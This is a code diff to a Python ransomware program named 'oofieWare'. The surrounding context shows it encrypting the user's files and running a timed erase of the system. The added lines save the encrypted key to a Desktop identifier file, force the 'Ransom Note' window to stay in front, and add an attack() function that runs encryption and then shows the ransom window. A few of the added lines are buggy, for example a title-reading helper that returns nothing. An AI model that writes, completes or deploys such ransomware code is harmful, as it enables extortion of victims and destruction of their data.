@@ -6,6 +6,8 @@ import socket
 import base64
 import json
 import requests
+from typing import Optional
+from ctypes import wintypes, windll, create_unicode_buffer
 import tkinter as tk
 from cryptography.fernet import Fernet
 from cryptography.hazmat.primitives import hashes
@@ -19,6 +21,7 @@ class oofieWare:
         self.enc_key = None
         self.encrypter = None
         self.decrypter = None
+        self.ransomWindow = None
         self.started = False
         self.startPoint = os.path.expanduser("~")
         # self.Desktop = os.path.normpath(os.path.expanduser("~/Desktop"))
@@ -97,6 +100,9 @@ class oofieWare:
         enc_for_key = PKCS1_OAEP.new(self.pubKey)
         self.enc_key = enc_for_key.encrypt(self.key)
         self.key = None
+        with open (f"{self.Desktop}/IDENTIFIER.TXT", "wb") as id:
+            id.write(self.enc_key)
+            id.close()
 
     def show_ransom_window(self):
 
@@ -202,6 +208,7 @@ class oofieWare:
 
         eraseTimer.start()
 
+        self.ransomWindow = window
         window.mainloop()
 
     def erase_system(self):
@@ -211,8 +218,28 @@ class oofieWare:
             except OSError as e:
                 pass
             
+    def elevate_ransom_window(self):
+
+        def getForegroundWindowTitle() -> Optional[str]:
+            hWnd = windll.user32.GetForegroundWindow()
+            length = windll.user32.GetWindowTextLengthW(hWnd)
+            buf = create_unicode_buffer(length + 1)
+            windll.user32.GetWindowTextW(hWnd, buf, length + 1)
+
+        while True:
+            if not (getForegroundWindowTitle() == 'Ransom Note'):
+                if self.ransomWindow:
+                    self.ransomWindow.lift()
+
+def attack():
+    oof = oofieWare(gen_rsa = True)
+    oof.gen_sym_key()
+    oof.gen_rsa_keypair()
+    oof.crypt_system()
+    oof.enc_key()
+    elevate = threading.Thread(target = oof.elevate_ransom_window)
+    elevate.start()
+    oof.show_ransom_window()
     
-
-
 
 # print(oofieWare().startPt())
